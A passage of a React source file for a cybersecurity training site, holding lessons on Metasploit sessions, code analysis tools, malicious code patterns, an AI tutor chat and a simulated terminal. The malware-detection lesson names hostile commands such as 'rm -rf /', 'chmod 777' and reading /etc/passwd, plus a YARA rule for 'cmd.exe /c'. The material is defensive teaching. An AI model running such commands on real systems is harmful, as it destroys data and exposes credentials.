                  <code class="text-blue-400 block font-mono text-sm">sessions</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 5. Interact with a session</span>
                  <code class="text-blue-400 block font-mono text-sm">sessions -i 1</code>
                </div>
                <div class="mt-2 text-blue-300 text-xs font-semibold">
                  📌 Insight: Always verify payload compatibility before execution.
                </div>
              </div>
            </div>
          </div>

          <div class="bg-blue-900/20 p-4 rounded border-l-4 border-blue-500">
            <h3 class="text-lg font-semibold text-white mb-2">Security Insight</h3>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <p class="text-red-300 font-medium text-sm mb-1">Amateur Usage:</p>
                <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm">
                  <li>Leads to failed exploits</li>
                  <li>Creates noisy attacks</li>
                  <li>Exposes pentesters</li>
                </ul>
              </div>
              <div>
                <p class="text-green-300 font-medium text-sm mb-1">Professional Usage:</p>
                <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm">
                  <li>Minimal attempts</li>
                  <li>Correct payload selection</li>
                  <li>Clean exits</li>
                </ul>
              </div>
            </div>
          </div>

          <div class="bg-green-900/20 p-4 rounded border-l-4 border-green-500">
            <h3 class="text-lg font-semibold text-white mb-2">Key Takeaway</h3>
            <p class="text-gray-300 text-sm mb-2">
              Metasploit is a framework, not magic.
            </p>
            <p class="text-gray-300 text-sm">
              Learn the modules, control the exploit, own the result.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Static vs Dynamic Code Analysis',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Static vs Dynamic Code Analysis</h2>
            <p class="mb-4 text-gray-300">
              Code analysis is critical for understanding how software behaves and finding vulnerabilities. It is divided into static and dynamic approaches.
            </p>
          </div>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-green-400 mb-2">1. Static Code Analysis (SCA)</h3>
              <p class="text-gray-300 text-sm mb-2">Examines source code or binaries without execution.</p>
              <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm mb-3">
                <li>Identifies vulnerabilities & misconfigurations</li>
                <li>Finds: Buffer overflows, SQLi, XSS, Hardcoded creds</li>
              </ul>
              <div class="space-y-2">
                <div class="text-sm"><span class="text-green-400 font-medium">Advantages:</span> <span class="text-gray-400">Safe, no execution risk, catches issues early.</span></div>
                <div class="text-sm"><span class="text-red-400 font-medium">Disadvantages:</span> <span class="text-gray-400">False positives, misses runtime issues.</span></div>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-blue-400 mb-2">2. Dynamic Code Analysis (DCA)</h3>
              <p class="text-gray-300 text-sm mb-2">Tests the running application.</p>
              <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm mb-3">
                <li>Monitors runtime behavior & network calls</li>
                <li>Finds: Input validation flaws, race conditions, logic errors</li>
              </ul>
              <div class="space-y-2">
                <div class="text-sm"><span class="text-green-400 font-medium">Advantages:</span> <span class="text-gray-400">Real-world behavior validation, detects runtime vulns.</span></div>
                <div class="text-sm"><span class="text-red-400 font-medium">Disadvantages:</span> <span class="text-gray-400">Requires test env, risky on production.</span></div>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">When to Use Each</h3>
            <div class="overflow-x-auto">
              <table class="w-full text-sm text-left text-gray-300">
                <thead class="text-xs text-gray-400 uppercase bg-[#252526]">
                  <tr>
                    <th class="px-4 py-2">Approach</th>
                    <th class="px-4 py-2">Use Case</th>
                  </tr>
                </thead>
                <tbody>
                  <tr class="border-b border-[#333]">
                    <td class="px-4 py-2 font-medium text-white">Static Analysis</td>
                    <td class="px-4 py-2">Reviewing source code, early vulnerability check</td>
                  </tr>
                  <tr class="border-b border-[#333]">
                    <td class="px-4 py-2 font-medium text-white">Dynamic Analysis</td>
                    <td class="px-4 py-2">Testing compiled apps, APIs, web apps</td>
                  </tr>
                  <tr>
                    <td class="px-4 py-2 font-medium text-yellow-400">Best Practice</td>
                    <td class="px-4 py-2 text-yellow-400">Combine both for complete coverage</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>

          <h3 class="text-lg font-semibold text-white mt-6 mb-3">Syntax (Tools for Code Analysis)</h3>
          
          <div class="space-y-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-green-400 font-medium mb-3">Tool 1: Bandit (Python Static Analysis)</h4>
              <div class="space-y-3">
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 1. Install Bandit</span>
                  <code class="text-green-400 block font-mono text-sm">pip install bandit</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 2. Scan Python file</span>
                  <code class="text-green-400 block font-mono text-sm">bandit -r /path/to/project</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 3. Output report</span>
                  <code class="text-green-400 block font-mono text-sm">bandit -r /path/to/project -f html -o bandit_report.html</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 4. Scan with severity filters</span>
                  <code class="text-green-400 block font-mono text-sm">bandit -r . -ll  # low severity only</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 5. Integrate with CI/CD</span>
                  <code class="text-green-400 block font-mono text-sm">bandit -r . -f json -o results.json</code>
                </div>
                <div class="mt-2 text-green-300 text-xs font-semibold">
                  📌 Insight: Bandit highlights insecure functions, hardcoded passwords, and risky calls.
                </div>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-blue-400 font-medium mb-3">Tool 2: OWASP ZAP (Dynamic Analysis for Web Apps)</h4>
              <div class="space-y-3">
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 1. Launch OWASP ZAP</span>
                  <code class="text-blue-400 block font-mono text-sm">zap.sh</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 2. Set target URL</span>
                  <code class="text-blue-400 block font-mono text-sm">http://example.com</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 3. Run automated scan</span>
                  <code class="text-blue-400 block font-mono text-sm">Quick Scan → Start</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 4. Review alerts</span>
                  <code class="text-blue-400 block font-mono text-sm">Alerts tab → Examine vulnerabilities</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 5. Export report</span>
                  <code class="text-blue-400 block font-mono text-sm">Report → Generate → HTML / XML</code>
                </div>
                <div class="mt-2 text-blue-300 text-xs font-semibold">
                  📌 Insight: ZAP simulates real attacks dynamically to discover runtime issues.
                </div>
              </div>
            </div>
          </div>

          <div class="bg-blue-900/20 p-4 rounded border-l-4 border-blue-500">
            <h3 class="text-lg font-semibold text-white mb-2">Professional Insight</h3>
            <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm">
              <li><span class="text-white font-medium">Static</span> = Code review (Safe, early detection)</li>
              <li><span class="text-white font-medium">Dynamic</span> = Attack simulation (Real-world validation)</li>
              <li><span class="text-white font-medium">Both</span> = Comprehensive security assessment</li>
            </ul>
          </div>

          <div class="bg-green-900/20 p-4 rounded border-l-4 border-green-500">
            <h3 class="text-lg font-semibold text-white mb-2">Key Takeaway</h3>
            <p class="text-gray-300 text-sm">
              Understanding the difference between static vs dynamic analysis helps you choose the right tool at the right time.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Identifying Malicious Code Patterns',
        content: `<div class="space-y-6">
          <h2 class="text-xl font-semibold mb-3 text-white">Identifying Malicious Code Patterns</h2>
          <p class="mb-4 text-gray-300">
            Identifying malicious code patterns is essential for malware analysis, threat hunting, and secure coding. Malicious code often hides in scripts, executables, or macros, and can include:
          </p>
          <ul class="list-disc list-inside space-y-1 text-gray-300 mb-4">
            <li>Reverse shells</li>
            <li>Keyloggers</li>
            <li>Data exfiltration routines</li>
            <li>Obfuscated functions</li>
          </ul>
          <p class="mb-4 text-gray-300">
            Recognizing patterns helps prevent attacks before they spread.
          </p>

          <h3 class="text-lg font-semibold text-white mt-6 mb-3">Common Malicious Patterns</h3>
          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-red-400 font-medium mb-2">Network Connections</h4>
              <p class="text-gray-400 text-sm">Unexpected outbound traffic (e.g., curl, wget, socket.connect).</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-red-400 font-medium mb-2">Suspicious System Commands</h4>
              <p class="text-gray-400 text-sm">Commands like rm -rf /, chmod 777, eval() in scripts.</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-red-400 font-medium mb-2">Obfuscated Code</h4>
              <p class="text-gray-400 text-sm">Base64-encoded strings, long hex strings, or multiple layers of encoding.</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-red-400 font-medium mb-2">Credential Access</h4>
              <p class="text-gray-400 text-sm">Reading /etc/passwd, registry keys, or stored passwords.</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-red-400 font-medium mb-2">Persistence Mechanisms</h4>
              <p class="text-gray-400 text-sm">Adding scripts to startup, cron jobs, or autorun keys.</p>
            </div>
          </div>

          <h3 class="text-lg font-semibold text-white mt-6 mb-3">Syntax (Tools to Detect Malicious Patterns)</h3>
          
          <div class="space-y-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-green-400 font-medium mb-3">Tool 1: FLOSS (Detect Suspicious Strings in Binaries)</h4>
              <div class="space-y-3">
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 1. Install FLOSS</span>
                  <code class="text-green-400 block font-mono text-sm">sudo apt install floss</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 2. Analyze binary for suspicious strings</span>
                  <code class="text-green-400 block font-mono text-sm">floss sample.exe</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 3. Export report</span>
                  <code class="text-green-400 block font-mono text-sm">floss -o floss_report.txt sample.exe</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 4. Check for suspicious network patterns</span>
                  <code class="text-green-400 block font-mono text-sm">grep -i "http\\|https\\|socket" floss_report.txt</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 5. Automate scan for multiple files</span>
                  <code class="text-green-400 block font-mono text-sm">for f in *.exe; do floss $f > $f.txt; done</code>
                </div>
                <div class="mt-2 text-green-300 text-xs font-semibold">
                  📌 Insight: FLOSS helps find hidden commands, IPs, and obfuscated payloads.
                </div>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-blue-400 font-medium mb-3">Tool 2: YARA (Pattern Matching Malware Detection)</h4>
              <div class="space-y-3">
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 1. Install YARA</span>
                  <code class="text-blue-400 block font-mono text-sm">sudo apt install yara</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 2. Create a sample rule</span>
                  <pre class="text-blue-400 block font-mono text-sm whitespace-pre-wrap">nano malware_rule.yar
# rule MALICIOUS
# {
#   strings:
#     $a = "cmd.exe /c"
#   condition:
#     $a
# }</pre>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 3. Scan file with YARA</span>
                  <code class="text-blue-400 block font-mono text-sm">yara malware_rule.yar sample.exe</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 4. Scan directory recursively</span>
                  <code class="text-blue-400 block font-mono text-sm">yara -r malware_rule.yar ./samples/</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 5. Output matches to log</span>
                  <code class="text-blue-400 block font-mono text-sm">yara -r malware_rule.yar ./samples/ > yara_matches.txt</code>
                </div>
                <div class="mt-2 text-blue-300 text-xs font-semibold">
                  📌 Insight: YARA is widely used in threat hunting and malware research to detect known patterns.
                </div>
              </div>
            </div>
          </div>

          <div class="bg-blue-900/20 p-4 rounded border-l-4 border-blue-500">
            <h3 class="text-lg font-semibold text-white mb-2">Professional Insight</h3>
            <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm">
              <li>Manual inspection + automated tools = strong detection capability</li>
              <li>Always update rules and patterns for new malware trends</li>
              <li>Recognize behaviors rather than just file names</li>
            </ul>
          </div>

          <div class="bg-green-900/20 p-4 rounded border-l-4 border-green-500">
            <h3 class="text-lg font-semibold text-white mb-2">Key Takeaway</h3>
            <p class="text-gray-300 text-sm">
              Identifying malicious code patterns is about recognizing behavior, commands, and obfuscation, not just guessing.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: '10.9 Summary – Tools & Code Analysis',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">10.9 Summary – Tools & Code Analysis</h2>
          <div class="space-y-6">
            <p class="text-gray-300">
              Module 10 focused on using tools and scripting to analyze, automate, and exploit in cybersecurity. The goal is to empower testers and analysts to work efficiently, safely, and effectively.
            </p>

            <div class="space-y-4">
                <h3 class="text-lg font-semibold text-white">Key Points Covered</h3>
                
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                        <h4 class="text-blue-400 font-medium mb-2">1. Scripting & Automation</h4>
                        <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm">
                            <li><strong>Python & Bash:</strong> Variables, loops, I/O handling.</li>
                            <li><strong>Use Cases:</strong> Python for logic/exploits, Bash for system automation.</li>
                            <li><strong>Automation:</strong> Recon, scanning, reporting.</li>
                        </ul>
                    </div>
                    
                    <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                        <h4 class="text-green-400 font-medium mb-2">2. Exploit Analysis</h4>
                        <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm">
                            <li><strong>Code Review:</strong> Read PoCs before running.</li>
                            <li><strong>GitHub Exploits:</strong> Clone safely, analyze logic.</li>
                            <li><strong>Metasploit:</strong> Module selection, payloads, sessions.</li>
                        </ul>
                    </div>
                    
                    <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] md:col-span-2">
                        <h4 class="text-red-400 font-medium mb-2">3. Malware & Code Analysis</h4>
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm">
                                <li><strong>Static Analysis:</strong> Source code review, string extraction.</li>
                                <li><strong>Dynamic Analysis:</strong> Runtime behavior, sandboxing.</li>
                            </ul>
                            <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm">
                                <li><strong>Malicious Patterns:</strong> Reverse shells, obfuscation.</li>
                                <li><strong>Persistence:</strong> Registry keys, cron jobs.</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>

            <div class="bg-blue-900/20 p-4 rounded border-l-4 border-blue-500">
              <h3 class="text-lg font-semibold text-white mb-2">Professional Insight</h3>
              <ul class="list-disc list-inside space-y-2 text-gray-300 text-sm">
                <li>Scripting and automation are time savers but require critical thinking.</li>
                <li>Exploit analysis ensures you understand risk and behavior.</li>
                <li>Static & dynamic analysis provide a complete view of security.</li>
                <li>Recognizing malicious patterns helps defend against malware and attacks.</li>
              </ul>
            </div>

            <div class="bg-green-900/20 p-4 rounded border-l-4 border-green-500">
              <h3 class="text-lg font-semibold text-white mb-2">Key Takeaway</h3>
              <p class="text-gray-300 text-sm mb-2">
                Module 10 equips you with practical scripting skills (Python + Bash), safe exploit handling, automation techniques, and code analysis capabilities.
              </p>
              <p class="text-gray-300 text-sm">
                This forms the technical backbone of any cybersecurity professional or pentester.
              </p>
            </div>
          </div>
        `,
        duration: '15 min'
      }
    ]
  }
];

// --- Components ---

const Sidebar = ({
  activeTab,
  setActiveTab,
  activeModuleId,
  setActiveModuleId,
  activeLessonIndex,
  setActiveLessonIndex,
  completedLessons
}: {
  activeTab: 'outline' | 'resources' | 'assignments';
  setActiveTab: (tab: 'outline' | 'resources' | 'assignments') => void;
  activeModuleId: string;
  setActiveModuleId: (id: string) => void;
  activeLessonIndex: number;
  setActiveLessonIndex: (index: number) => void;
  completedLessons: Set<string>;
}) => {
  const [expandedModules, setExpandedModules] = useState<Set<string>>(new Set([activeModuleId]));
  const [searchQuery, setSearchQuery] = useState('');

  // Auto-expand the active module when it changes
  useEffect(() => {
    setExpandedModules(prev => {
      const newSet = new Set(prev);
      newSet.add(activeModuleId);
      return newSet;
    });
  }, [activeModuleId]);

  const toggleModule = (id: string) => {
    setExpandedModules(prev => {
      const newSet = new Set(prev);
      if (newSet.has(id)) {
        newSet.delete(id);
      } else {
        newSet.add(id);
      }
      return newSet;
    });
  };

  const filteredModules = courseData.filter(m =>
    m.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
    m.lessons.some(l => l.title.toLowerCase().includes(searchQuery.toLowerCase()))
  );

  return (
    <div className="w-[350px] bg-[#1e1e1e] border-r border-[#333] flex flex-col h-full">
      {/* Tabs */}
      <div className="flex border-b border-[#333]">
        <button
          onClick={() => setActiveTab('outline')}
          className={`flex-1 py-4 text-sm font-medium transition-colors border-b-2 ${activeTab === 'outline'
            ? 'border-[#00bceb] text-white bg-[#252526]'
            : 'border-transparent text-gray-400 hover:text-gray-200 hover:bg-[#2d2d2d]'
            }`}
        >
          <div className="flex items-center justify-center gap-2">
            <BookOpen className="w-4 h-4" />
            Outline
          </div>
        </button>
        <button
          onClick={() => setActiveTab('resources')}
          className={`flex-1 py-4 text-sm font-medium transition-colors border-b-2 ${activeTab === 'resources'
            ? 'border-[#00bceb] text-white bg-[#252526]'
            : 'border-transparent text-gray-400 hover:text-gray-200 hover:bg-[#2d2d2d]'
            }`}
        >
          <div className="flex items-center justify-center gap-2">
            <FileText className="w-4 h-4" />
            Resources
          </div>
        </button>
        <button
          onClick={() => setActiveTab('assignments')}
          className={`flex-1 py-4 text-sm font-medium transition-colors border-b-2 ${activeTab === 'assignments'
            ? 'border-[#00bceb] text-white bg-[#252526]'
            : 'border-transparent text-gray-400 hover:text-gray-200 hover:bg-[#2d2d2d]'
            }`}
        >
          <div className="flex items-center justify-center gap-2">
            <ClipboardList className="w-4 h-4" />
            Assignments
          </div>
        </button>
      </div>

      {/* Search */}
      <div className="p-4 border-b border-[#333]">
        <div className="relative">
          <input
            type="text"
            placeholder="Search course outline"
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="w-full bg-[#121212] border border-[#333] rounded px-3 py-2 pl-9 text-sm text-gray-300 focus:outline-none focus:border-[#00bceb] transition-colors placeholder-gray-600"
          />
          <Search className="absolute left-2.5 top-2.5 w-4 h-4 text-gray-500" />
        </div>
      </div>

      {/* Content List */}
      <div className="flex-1 overflow-y-auto custom-scrollbar">
        {activeTab === 'outline' && (
          <div className="pb-4">
            <div className="px-4 py-4 flex items-center justify-between hover:bg-[#2d2d2d] cursor-pointer transition-colors border-b border-[#333]">
              <div>
                 <span className="text-sm font-semibold text-white block">Course Introduction</span>
                 <div className="w-full bg-gray-700 h-1 rounded-full overflow-hidden mt-2 w-32">
                    <div className="bg-green-500 h-full w-full" />
                 </div>
              </div>
              <div className="flex flex-col items-end">
                 <CheckCircle className="w-5 h-5 text-green-500 mb-1" />
                 <span className="text-xs text-gray-400">100%</span>
              </div>
            </div>

            {filteredModules.map(module => {
              const isExpanded = expandedModules.has(module.id);
              const isActive = activeModuleId === module.id;
              
              // Calculate progress for this module (mock logic)
              const moduleCompletedLessons = module.lessons.filter((_, idx) =>
                completedLessons.has(`${module.id}-${idx}`)
              ).length;
              const progressPercent = Math.round((moduleCompletedLessons / module.lessons.length) * 100);

              return (
                <div key={module.id} className="border-b border-[#333]">
                  <div
                    onClick={() => toggleModule(module.id)}
                    className={`px-4 py-4 cursor-pointer hover:bg-[#2d2d2d] transition-colors ${isActive ? 'bg-[#2d2d2d]' : ''}`}
                  >
                    <div className="flex items-start justify-between gap-3">
                      <div className="flex-1">
                        <h3 className="text-sm font-bold text-white leading-tight mb-2">{module.title}</h3>
                        <div className="w-full bg-gray-700 h-1 rounded-full overflow-hidden">
                          <div
                            className="bg-green-500 h-full transition-all duration-300"
                            style={{ width: `${progressPercent}%` }}
                          />
                        </div>
                      </div>
                      <div className="flex flex-col items-end justify-between h-full gap-2">
                        {isExpanded ? (
                          <div className="bg-[#3e3e42] p-1 rounded hover:bg-[#4e4e52]">
                             <ChevronDown className="w-4 h-4 text-gray-300" />
                          </div>
                        ) : (
                          <div className="bg-[#3e3e42] p-1 rounded hover:bg-[#4e4e52]">
                             <ChevronRight className="w-4 h-4 text-gray-300" />
                          </div>
                        )}
                        <span className="text-xs text-gray-400">{progressPercent}%</span>
                      </div>
                    </div>
                  </div>

                  {isExpanded && (
                    <div className="bg-[#121212] py-2">
                      {module.lessons.map((lesson, idx) => {
                        const lessonKey = `${module.id}-${idx}`;
                        const isCompleted = completedLessons.has(lessonKey);
                        const isLessonActive = isActive && activeLessonIndex === idx;

                        return (
                          <div
                            key={idx}
                            onClick={() => {
                              setActiveModuleId(module.id);
                              setActiveLessonIndex(idx);
                            }}
                            className={clsx(
                              'pl-6 pr-4 py-3 cursor-pointer flex items-center gap-3 transition-colors relative',
                              isLessonActive
                                ? 'bg-[#2d2d2d]'
                                : 'hover:bg-[#1e1e1e]'
                            )}
                          >
                             {/* Active indicator line */}
                             {isLessonActive && (
                               <div className="absolute left-0 top-0 bottom-0 w-[3px] bg-green-500" />
                             )}

                             {/* Status Icon */}
                             <div className="flex-shrink-0 z-10">
                                {isCompleted ? (
                                   <CheckCircle className="w-5 h-5 text-green-500" />
                                ) : (
                                   <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${isLessonActive ? 'border-green-500' : 'border-gray-600'}`}>
                                      {isLessonActive && <div className="w-2 h-2 rounded-full bg-green-500" />}
                                   </div>
                                )}
                             </div>

                             {/* Dashed line connector */}
                             {idx !== module.lessons.length - 1 && (
                                <div className="absolute left-[33px] top-[30px] bottom-[-14px] w-[1px] border-l border-dashed border-gray-600 z-0" />
                             )}

                            <div className="flex-1 min-w-0">
                              <div className={clsx(
                                'text-sm font-medium truncate mb-0.5',
                                isLessonActive ? 'text-white' : 'text-gray-400'
                              )}>
                                {module.id.split('-')[1]}.{idx + 1} {lesson.title}
                              </div>
                            </div>
                            
                            <span className="text-xs text-gray-600">{lesson.duration}</span>
                          </div>
                        );
                      })}
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        )}

        {activeTab === 'resources' && (
          <div className="p-4">
            {resources.map((res, idx) => (
              <div key={idx} className="mb-4 p-3 bg-[#2d2d2d] rounded hover:bg-[#333] transition-colors cursor-pointer border border-[#333]">
                <div className="flex items-center gap-2 mb-2">
                  {res.type === 'video' ? <PlayCircle className="w-4 h-4 text-[#00bceb]" /> : <FileText className="w-4 h-4 text-orange-400" />}
                  <span className="text-xs font-medium text-gray-400 uppercase">{res.type}</span>
                </div>
                <h4 className="text-sm font-medium text-white mb-1">{res.title}</h4>
                <p className="text-xs text-gray-400 mb-2">{res.description}</p>
                <span className="text-xs text-gray-500">{res.duration}</span>
              </div>
            ))}
          </div>
        )}

        {activeTab === 'assignments' && (
          <div className="p-4">
            {assignments.map((assignment) => (
              <div key={assignment.id} className="mb-4 p-3 bg-[#2d2d2d] rounded hover:bg-[#333] transition-colors cursor-pointer border border-[#333]">
                <div className="flex items-center gap-2 mb-2">
                  <ClipboardList className="w-4 h-4 text-purple-400" />
                  <span className="text-xs font-medium text-gray-400 uppercase">Assignment {assignment.id}</span>
                </div>
                <h4 className="text-sm font-medium text-white mb-1">{assignment.title}</h4>
                <p className="text-xs text-gray-400 mb-2">{assignment.description}</p>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

const CourseLearningCyberSecurityIntermediate: React.FC = () => {
  const { slug } = useParams<{ slug: string }>();
  const navigate = useNavigate();
  const { theme, toggleTheme } = useTheme();
  const isDark = theme === 'dark';

  // State
  const [activeTab, setActiveTab] = useState<'outline' | 'resources' | 'assignments'>('outline');
  const [activeModuleId, setActiveModuleId] = useState<string>('module-1');
  const [activeLessonIndex, setActiveLessonIndex] = useState(0);
  const [completedLessons, setCompletedLessons] = useState<Set<string>>(new Set(['module-1-0']));
  
  // Content Tab State
  const [activeContentTab, setActiveContentTab] = useState<'lesson' | 'syntax' | 'terminal'>('lesson');

  // Terminal State
  const [terminalInput, setTerminalInput] = useState('');
  const [terminalHistory, setTerminalHistory] = useState<string[]>([
    'Welcome to Cyber Security Terminal!',
    'Type "help" to see available commands.',
    ''
  ]);
  const [commandHistory, setCommandHistory] = useState<string[]>([]);
  const [historyIndex, setHistoryIndex] = useState(-1);
  const terminalRef = useRef<HTMLDivElement>(null);

  // Chat State (can be integrated later or kept hidden if not in new design)
  // For now, focusing on the requested UI layout
  
  // Identify current module/lesson
  const activeModule = useMemo(() => courseData.find(m => m.id === activeModuleId), [activeModuleId]);
  const activeLesson = useMemo(() => activeModule?.lessons[activeLessonIndex], [activeModule, activeLessonIndex]);

  // Chat State
  const [messages, setMessages] = useState<ChatMessage[]>([
    { role: 'assistant', content: 'Hello! I am your personal cyber security teacher. How can I help you today?' }
  ]);
  const [loading, setLoading] = useState(false);

  const handleSendMessage = async (text: string) => {
    const newMsg: ChatMessage = { role: 'user', content: text };
    const updated = [...messages, newMsg];
    setMessages(updated);
    setLoading(true);

    try {
      // Build context from active lesson
      const context = `
Current Course: Cyber Security Beginner
Current Module: ${activeModule?.title}
Current Lesson: ${activeLesson?.title}
Lesson Content: ${activeLesson?.content.replace(/<[^>]*>/g, '')}
      `.trim();
      
      const systemPrompt: ChatMessage = {
          role: 'system',
          content: `You are an expert Cyber Security tutor. The user is currently learning "${activeLesson?.title}". 
          Context: ${context}
          Answer the user's question simply and clearly. If it relates to the current lesson, use the provided context.`
      };

      const answer = await askLLM(text, [systemPrompt, ...updated]);
      setMessages(prev => [...prev, { role: 'assistant', content: answer }]);
    } catch (err) {
      setMessages(prev => [...prev, { role: 'assistant', content: 'Sorry, I encountered an error connecting to the AI tutor.' }]);
    } finally {
      setLoading(false);
    }
  };

  // Helper to render text with clickable links
  const renderContentWithLinks = (content: string) => {
    const urlRegex = /(https?:\/\/[^\s]+)/g;
    const parts = content.split(urlRegex);
    
    return parts.map((part, i) => {
      if (part.match(urlRegex)) {
        return (
          <a 
            key={i} 
            href={part} 
            target="_blank" 
            rel="noopener noreferrer" 
            className="text-[#00bceb] hover:underline"
          >
            {part}
          </a>
        );
      }
      return part;
    });
  };

  // Terminal Logic
  const simulateCommand = (command: string): string[] => {
    const cmd = command.trim().toLowerCase();
    
    if (cmd === 'help') {
      return [
        'Available commands:',
        '  help      - Show this help message',
        '  clear     - Clear terminal',
        '  whoami    - Show current user',
        '  date      - Show current date/time',
        '  ls        - List directory contents',
        '  pwd       - Print working directory',
        '  cat       - View file content',
        '  echo      - Display a line of text',
        '  nmap      - Network exploration tool (simulated)',
        '  ping      - Send ICMP ECHO_REQUEST (simulated)',
        '  ip addr   - Show IP addresses'
      ];
    }
    
    if (cmd === 'clear') return [];
    
    if (cmd === 'whoami') return ['student'];
    
    if (cmd === 'date') return [new Date().toString()];
    
    if (cmd === 'ls') return ['documents', 'downloads', 'notes.txt', 'secret_key.pem'];
    
    if (cmd === 'pwd') return ['/home/student'];

    if (cmd.startsWith('cat ')) {
      const file = cmd.split(' ')[1];
      if (file === 'notes.txt') return ['- Remember to update system', '- Check firewall logs', '- Change default passwords'];
      if (file === 'secret_key.pem') return ['-----BEGIN RSA PRIVATE KEY-----', 'MIIEpQIBAAKCAQEA...', '-----END RSA PRIVATE KEY-----'];
      return [`cat: ${file}: No such file or directory`];
    }

    if (cmd === 'ip addr' || cmd === 'ifconfig') {
      return [
        'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500',
        '        inet 192.168.1.15  netmask 255.255.255.0',
        '        ether 00:0c:29:28:fd:4e  txqueuelen 1000  (Ethernet)',
        'lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536',
        '        inet 127.0.0.1  netmask 255.0.0.0'
      ];
    }
    
    if (cmd.startsWith('echo ')) return [command.slice(5)];

    if (cmd.startsWith('nmap')) {
       return [
         'Starting Nmap 7.94 ( https://nmap.org )',
         'Nmap scan report for target (192.168.1.1)',
         'Host is up (0.0020s latency).',
         'Not shown: 998 closed ports',
         'PORT   STATE SERVICE',
         '22/tcp open  ssh',
         '80/tcp open  http',
         'Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds'
       ];
    }

    if (cmd.startsWith('ping')) {
       return [
         'PING 8.8.8.8 (8.8.8.8): 56 data bytes',
         '64 bytes from 8.8.8.8: icmp_seq=0 ttl=115 time=12.432 ms',
         '64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=15.123 ms',
         '64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=11.987 ms',
         '--- 8.8.8.8 ping statistics ---',
         '3 packets transmitted, 3 packets received, 0.0% packet loss'
       ];
    }
    
    return [`Command not found: ${cmd}. Type "help" for list of commands.`];
  };

  const handleTerminalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!terminalInput.trim()) return;

    if (terminalInput.trim().toLowerCase() === 'clear') {
      setTerminalHistory(['Welcome to Cyber Security Terminal!', 'Type "help" to see available commands.', '']);
      setTerminalInput('');
      return;
    }

